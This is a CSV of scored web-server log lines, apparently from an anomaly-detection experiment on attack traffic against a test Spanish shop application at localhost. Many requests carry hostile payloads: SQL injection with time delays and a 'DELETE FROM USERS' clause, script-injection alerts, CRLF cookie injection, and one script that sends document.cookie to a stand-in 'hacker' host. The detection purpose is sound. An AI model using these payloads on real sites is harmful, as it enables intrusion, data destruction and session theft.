score_content,score_session,score_fused,score_fused_norm,line
3.1348485946655273,0.8970744013786316,2.0159614980220795,2.0159614980220795,localhost:8080 - - [10/Jan/2025:15:29:53 +0000] "POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.014540433883667,0.8804969787597656,0.9475187063217163,0.9475187063217163,localhost:8080 - - [10/Jan/2025:15:29:53 +0000] "GET http://localhost:8080/tienda1/publico/anadir.jsp/asf-logo-wide HTTP/1.1 HTTP/1.1" 200 213 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
29.284387588500977,0.8852741718292236,15.0848308801651,15.0848308801651,localhost:8080 - - [10/Jan/2025:15:29:54 +0000] "GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=iseno**r&pwd=0axmord%F3n&remember=off&B1=Entrar HTTP/1.1 HTTP/1.1" 200 381 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.2718217372894287,0.8859896659851074,2.078905701637268,2.078905701637268,localhost:8080 - - [10/Jan/2025:15:29:54 +0000] "POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
29.135875701904297,0.7850587368011475,14.960467219352722,14.960467219352722,localhost:8080 - - [10/Jan/2025:15:29:54 +0000] "GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ashley&pwdA=0axmord%F3n&remember=off&B1=Entrar HTTP/1.1 HTTP/1.1" 200 378 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.2718217372894287,0.8029371500015259,2.0373794436454773,2.0373794436454773,localhost:8080 - - [10/Jan/2025:15:29:54 +0000] "POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.575300693511963,0.8037890195846558,1.1895448565483093,1.1895448565483093,localhost:8080 - - [10/Jan/2025:15:29:55 +0000] "GET http://localhost:8080/tienda1/publico/autenticar.jsp/asf-logo-wide.gif/ HTTP/1.1 HTTP/1.1" 200 240 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
28.843914031982422,0.7233542799949646,14.783634155988693,14.783634155988693,localhost:8080 - - [10/Jan/2025:15:29:55 +0000] "GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1 HTTP/1.1" 200 372 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.4813954830169678,0.7243251204490662,2.102860301733017,2.102860301733017,localhost:8080 - - [10/Jan/2025:15:29:55 +0000] "POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 HTTP/1.1" 200 198 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.13982416689395905,0.593936026096344,0.3668800964951515,0.3668800964951515,localhost:8080 - - [10/Jan/2025:15:29:55 +0000] "GET http://localhost:8080/dspug.nsf HTTP/1.1 HTTP/1.1" 200 120 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
37.487918853759766,0.6113602519035339,19.04963955283165,19.04963955283165,localhost:8080 - - [10/Jan/2025:15:29:56 +0000] "GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectasbob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org HTTP/1.1 HTTP/1.1" 200 513 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.1348485946655273,0.5237632989883423,1.8293059468269348,1.8293059468269348,localhost:8080 - - [10/Jan/2025:15:29:56 +0000] "POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
25.09080696105957,0.5251204967498779,12.807963728904724,12.807963728904724,localhost:8080 - - [10/Jan/2025:15:29:56 +0000] "GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1 HTTP/1.1" 200 276 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.1348485946655273,0.44112804532051086,1.787988319993019,1.787988319993019,localhost:8080 - - [10/Jan/2025:15:29:56 +0000] "POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.438814640045166,0.4243880808353424,0.9316013604402542,0.9316013604402542,localhost:8080 - - [10/Jan/2025:15:29:57 +0000] "GET http://localhost:8080/IISSamples/sdk/asp/database/Update_VBScript.asp HTTP/1.1 HTTP/1.1" 200 234 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
37.71228790283203,0.4583735764026642,19.085330739617348,19.085330739617348,localhost:8080 - - [10/Jan/2025:15:29:57 +0000] "GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3796%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&B1=Pasar+por+caja HTTP/1.1 HTTP/1.1" 200 516 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.104874610900879,0.3526892364025116,1.7287819236516953,1.7287819236516953,localhost:8080 - - [10/Jan/2025:15:29:57 +0000] "POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 HTTP/1.1" 200 168 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
36.391361236572266,0.38195309042930603,18.386657163500786,18.386657163500786,localhost:8080 - - [10/Jan/2025:15:29:57 +0000] "GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3796&B1=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org HTTP/1.1 HTTP/1.1" 200 498 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.104874610900879,0.396759033203125,1.750816822052002,1.750816822052002,localhost:8080 - - [10/Jan/2025:15:29:58 +0000] "POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 HTTP/1.1" 200 168 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
26.18586540222168,0.3904133141040802,13.28813935816288,13.28813935816288,localhost:8080 - - [10/Jan/2025:15:29:58 +0000] "GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3796&B1=Pasar+por+caja%2F HTTP/1.1 HTTP/1.1" 200 309 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.104874610900879,0.39137357473373413,1.7481240928173065,1.7481240928173065,localhost:8080 - - [10/Jan/2025:15:29:58 +0000] "POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 HTTP/1.1" 200 168 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
25.9715518951416,0.4101870059967041,13.190869450569153,13.190869450569153,localhost:8080 - - [10/Jan/2025:15:29:58 +0000] "GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=3796&B1=Pasar+por+caja HTTP/1.1 HTTP/1.1" 200 303 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.104874610900879,0.4047398269176483,1.7548072189092636,1.7548072189092636,localhost:8080 - - [10/Jan/2025:15:29:59 +0000] "POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 HTTP/1.1" 200 168 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
133.42770385742188,0.5622902512550354,66.99499705433846,66.99499705433846,localhost:8080 - - [10/Jan/2025:15:29:59 +0000] "GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=terryl&password=des9erco&nombre=Haroid&apellidos=Dawaher&email=tchkhikvadze-castenada3%40soymadrile%F1o.mu&dni=14559882P&direccion=C%2F+Doctor+Francisco+Saiz+Sanz%2C+159%2C+%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&ciudad=Alberca%2C+La&cp=03770&provincia=Salamanca&ntc=3772824400880183&B1=Registrar HTTP/1.1 HTTP/1.1" 200 1203 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.1999216079711914,0.556881844997406,1.8784017264842987,1.8784017264842987,localhost:8080 - - [10/Jan/2025:15:29:59 +0000] "POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
85.2818603515625,0.6433320641517639,42.96259620785713,42.96259620785713,localhost:8080 - - [10/Jan/2025:15:29:59 +0000] "GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=terryl&password=des9erco&nombre=Haroid&apellidos=Dawaher&email=%27INJECTED_PARAM&dni=14559882P&direccion=C%2F+Doctor+Francisco+Saiz+Sanz%2C+159%2C+&ciudad=Alberca%2C+La&cp=03770&provincia=Salamanca&ntc=3772824400880183&B1=Registrar HTTP/1.1 HTTP/1.1" 200 933 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.1999216079711914,0.6615230441093445,1.930722326040268,1.930722326040268,localhost:8080 - - [10/Jan/2025:15:30:00 +0000] "POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
98.29426574707031,0.760791003704071,49.52752837538719,49.52752837538719,localhost:8080 - - [10/Jan/2025:15:30:00 +0000] "GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=terryl&password=des9erco&nombreA=Haroid&apellidos=Dawaher&email=tchkhikvadze-castenada3%40soymadrile%F1o.mu&dni=14559882P&direccion=C%2F+Doctor+Francisco+Saiz+Sanz%2C+159%2C+&ciudad=Alberca%2C+La&cp=03770&provincia=Salamanca&ntc=3772824400880183&B1=Registrar HTTP/1.1 HTTP/1.1" 200 1014 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.1999216079711914,0.7623594403266907,1.981140524148941,1.981140524148941,localhost:8080 - - [10/Jan/2025:15:30:00 +0000] "POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
58.63925552368164,0.8223101496696472,29.730782836675644,29.730782836675644,localhost:8080 - - [10/Jan/2025:15:30:00 +0000] "GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carritosessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E HTTP/1.1 HTTP/1.1" 200 735 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.1348485946655273,0.8053966760635376,1.9701226353645325,1.9701226353645325,localhost:8080 - - [10/Jan/2025:15:30:01 +0000] "POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.7185653448104858,0.7886433601379395,1.2536043524742126,1.2536043524742126,localhost:8080 - - [10/Jan/2025:15:30:01 +0000] "GET http://localhost:8080/tienda1/global/creditos.jsp/6909030637832563290.jsp HTTP/1.1 HTTP/1.1" 200 246 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.4475688636302948,0.7712217569351196,0.6093953102827072,0.6093953102827072,localhost:8080 - - [10/Jan/2025:15:30:01 +0000] "GET http://localhost:8080/tienda1/global/estilos.css~ HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
93.3318099975586,0.8694072961807251,47.10060864686966,47.10060864686966,localhost:8080 - - [10/Jan/2025:15:30:01 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=clark-st&password=4A4R5R&nombre=Semiramis&apellidos=Chapi+Vieira&email=tirard_lamore%40biosoftware.cv&dni=88665105J&direccion=Calle+Miguel+Romero+Matinez+S%2FN%2C+&ciudad=Sayalonga&cp=09227&provincia=L%3Fa+Ri%3Foj*a&ntc=2618138569718823&B1=Registrar HTTP/1.1 HTTP/1.1" 200 984 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.1665313243865967,0.8879843950271606,2.0272578597068787,2.0272578597068787,localhost:8080 - - [10/Jan/2025:15:30:02 +0000] "POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
89.48300170898438,0.9622705578804016,45.22263613343239,45.22263613343239,localhost:8080 - - [10/Jan/2025:15:30:02 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=clark-st&password=4A4R5R&nombre=Semiramis&apellidos=Chapi+Vieira&email=tirard_lamore%40biosoftware.cv&dni=88665105J&direccionA=Calle+Miguel+Romero+Matinez+S%2FN%2C+&ciudad=Sayalonga&cp=09227&provincia=Zamora&ntc=2618138569718823&B1=Registrar HTTP/1.1 HTTP/1.1" 200 960 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.1665313243865967,0.9633558988571167,2.0649436116218567,2.0649436116218567,localhost:8080 - - [10/Jan/2025:15:30:02 +0000] "POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.575300693511963,0.9301538467407227,1.2527272701263428,1.2527272701263428,localhost:8080 - - [10/Jan/2025:15:30:02 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp/asf-logo-wide.gif.Bak HTTP/1.1 HTTP/1.1" 200 240 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.15384210646152496,0.9203125238418579,0.5370773151516914,0.5370773151516914,localhost:8080 - - [10/Jan/2025:15:30:03 +0000] "GET http://localhost:8080/.INC HTTP/1.1 HTTP/1.1" 200 105 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
11.562430381774902,1.8185642957687378,6.69049733877182,6.69049733877182,localhost:9090 - - [10/Jan/2025:15:30:03 +0000] "PUT http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
30.86225700378418,0.925546407699585,15.893901705741882,15.893901705741882,localhost:8080 - - [10/Jan/2025:15:30:03 +0000] "GET http://localhost:8080/tienda1/publico/anadir.jsp?id=%4040&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=59&B1=A%F1adir+al+carrito HTTP/1.1 HTTP/1.1" 200 411 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.1348485946655273,0.9268636703491211,2.030856132507324,2.030856132507324,localhost:8080 - - [10/Jan/2025:15:30:03 +0000] "POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
31.19806480407715,0.9329506158828735,16.06550770998001,16.06550770998001,localhost:8080 - - [10/Jan/2025:15:30:04 +0000] "GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=yale&pwd=2NcOJa7&remember=on%27+DELETE+FROM+USERS&B1=Entrar HTTP/1.1 HTTP/1.1" 200 417 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.2718217372894287,0.9342050552368164,2.1030133962631226,2.1030133962631226,localhost:8080 - - [10/Jan/2025:15:30:04 +0000] "POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
29.740039825439453,0.7801663279533386,15.260103076696396,15.260103076696396,localhost:8080 - - [10/Jan/2025:15:30:04 +0000] "GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=yale&pwd=d%2Fesp%2FepI%27Tar&remember=on&B1=Entrar HTTP/1.1 HTTP/1.1" 200 390 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.2718217372894287,0.7816026210784912,2.02671217918396,2.02671217918396,localhost:8080 - - [10/Jan/2025:15:30:04 +0000] "POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
28.143531799316406,0.6973550319671631,14.420443415641785,14.420443415641785,localhost:8080 - - [10/Jan/2025:15:30:05 +0000] "GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&loginA=yale&pwd=2NcOJa7&remember=on&B1=Entrar HTTP/1.1 HTTP/1.1" 200 357 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.2718217372894287,0.6986992359161377,1.9852604866027832,1.9852604866027832,localhost:8080 - - [10/Jan/2025:15:30:05 +0000] "POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.4809591472148895,0.5749012231826782,0.5279301851987839,0.5279301851987839,localhost:8080 - - [10/Jan/2025:15:30:05 +0000] "GET http://localhost:8080/samples/sampsite/results.htm HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
32.60873794555664,0.5852853655815125,16.597011655569077,16.597011655569077,localhost:8080 - - [10/Jan/2025:15:30:05 +0000] "GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A HTTP/1.1 HTTP/1.1" 200 441 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.4813954830169678,0.5362342000007629,2.0088148415088654,2.0088148415088654,localhost:8080 - - [10/Jan/2025:15:30:06 +0000] "POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 HTTP/1.1" 200 198 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
24.66069221496582,0.536756694316864,12.598724454641342,12.598724454641342,localhost:8080 - - [10/Jan/2025:15:30:06 +0000] "GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%27INJECTED_PARAM HTTP/1.1 HTTP/1.1" 200 261 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.4813954830169678,0.5541986227035522,2.01779705286026,2.01779705286026,localhost:8080 - - [10/Jan/2025:15:30:06 +0000] "POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 HTTP/1.1" 200 198 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
23.624387741088867,0.5715293288230896,12.097958534955978,12.097958534955978,localhost:8080 - - [10/Jan/2025:15:30:06 +0000] "GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1 HTTP/1.1 HTTP/1.1" 200 216 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.4813954830169678,0.47115811705589294,1.9762768000364304,1.9762768000364304,localhost:8080 - - [10/Jan/2025:15:30:07 +0000] "POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 HTTP/1.1" 200 198 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.3091105222702026,0.4548312723636627,0.8819708973169327,0.8819708973169327,localhost:8080 - - [10/Jan/2025:15:30:07 +0000] "GET http://localhost:8080/tienda1/publico/carrito.jsp/asf-logo-wide.gif HTTP/1.1 HTTP/1.1" 200 228 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
2.0254194736480713,0.3430594801902771,1.1842394769191742,1.1842394769191742,localhost:8080 - - [10/Jan/2025:15:30:07 +0000] "GET http://localhost:8080/tienda1/publico/carrito.jsp/6909030637832563290.jsp.old HTTP/1.1 HTTP/1.1" 200 258 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
37.487918853759766,0.3593265116214752,18.92362268269062,18.92362268269062,localhost:8080 - - [10/Jan/2025:15:30:07 +0000] "GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectasbob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org HTTP/1.1 HTTP/1.1" 200 513 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.1348485946655273,0.3774326741695404,1.7561406344175339,1.7561406344175339,localhost:8080 - - [10/Jan/2025:15:30:08 +0000] "POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
31.540618896484375,0.3967902362346649,15.96870456635952,15.96870456635952,localhost:8080 - - [10/Jan/2025:15:30:08 +0000] "GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1 HTTP/1.1" 200 423 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.1348485946655273,0.3892460763454437,1.7620473355054855,1.7620473355054855,localhost:8080 - - [10/Jan/2025:15:30:08 +0000] "POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
25.09080696105957,0.3902300000190735,12.740518480539322,12.740518480539322,localhost:8080 - - [10/Jan/2025:15:30:08 +0000] "GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1 HTTP/1.1" 200 276 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.1348485946655273,0.3821185827255249,1.7584835886955261,1.7584835886955261,localhost:8080 - - [10/Jan/2025:15:30:09 +0000] "POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.41588619351387024,0.3670584261417389,0.39147230982780457,0.39147230982780457,localhost:8080 - - [10/Jan/2025:15:30:09 +0000] "GET http://localhost:8080/iissamples/ExAir/About.asp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.1464250534772873,0.34740757942199707,0.24691631644964218,0.24691631644964218,localhost:8080 - - [10/Jan/2025:15:30:09 +0000] "GET http://localhost:8080/tienda1.BAK HTTP/1.1 HTTP/1.1" 200 126 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.858176052570343,0.33133766055107117,0.5947568565607071,0.5947568565607071,localhost:8080 - - [10/Jan/2025:15:30:09 +0000] "GET http://localhost:8080/tienda1/publico/asf-logo-wide.gif.INC HTTP/1.1 HTTP/1.1" 200 204 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
11.532393455505371,1.8188376426696777,6.675615549087524,6.675615549087524,localhost:9090 - - [10/Jan/2025:15:30:10 +0000] "PUT http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 HTTP/1.1" 200 168 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
25.274694442749023,0.3271292746067047,12.800911858677864,12.800911858677864,localhost:8080 - - [10/Jan/2025:15:30:10 +0000] "GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=51&B1=Confirmar HTTP/1.1 HTTP/1.1" 200 282 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.104874610900879,0.32846346497535706,1.716669037938118,1.716669037938118,localhost:8080 - - [10/Jan/2025:15:30:10 +0000] "POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 HTTP/1.1" 200 168 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
114.1914291381836,0.47375643253326416,57.33259278535843,57.33259278535843,localhost:8080 - - [10/Jan/2025:15:30:10 +0000] "GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=mirabell&password=implIcaNte%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Yayn&apellidos=Boliart+Jubert&email=karlatos-woodcroft%40joyaseleccion.fr&dni=90456703A&direccion=Avenida+Vigo+194+&ciudad=Olula+de+Castro&cp=07195&provincia=Cuenca&ntc=6879168763922210&B1=Registrar HTTP/1.1 HTTP/1.1" 200 1104 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.1999216079711914,0.46362173557281494,1.8317716717720032,1.8317716717720032,localhost:8080 - - [10/Jan/2025:15:30:11 +0000] "POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
